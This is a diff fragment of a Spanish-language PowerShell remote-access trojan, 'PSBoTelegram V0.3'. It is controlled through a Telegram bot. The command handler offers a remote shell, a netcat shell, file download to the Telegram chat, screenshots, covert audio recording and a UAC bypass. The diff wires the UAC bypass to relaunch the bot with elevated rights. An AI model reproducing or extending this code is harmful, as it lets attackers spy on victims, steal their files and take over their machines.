@@ -161,11 +161,11 @@ $result = New-Object psobject -Property @{
 "Dominio" = $dominio
 "Privilegios" = $privilegios
  }
- $result | Select-Object usuario, dominio, privilegios | FL
+ $result | Select-Object usuario, dominio, privilegios 
 }
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
- $help = "PSBoTelegram V0.3`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio[*] /BypassUAC"
+ $help = "PSBoTelegram V0.3`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
@@ -178,6 +178,6 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
  if ($comando -like "/Audio*") {$segundos = $comando -replace "/Audio ","";graba-audio -botkey $botkey -chat_id $chat_id -segundos $segundos}
- if ($comando -like "/BypassUAC") {BypassUAC-CyberVaca; $texto = "Ejecutado el BypassUAC, espere la nueva conexion del BOT";envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/BypassUAC") {BypassUAC-CyberVaca -comando $agent_bot; $texto = "Ejecutado el BypassUAC, espere la nueva conexion del BOT";envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 
 }
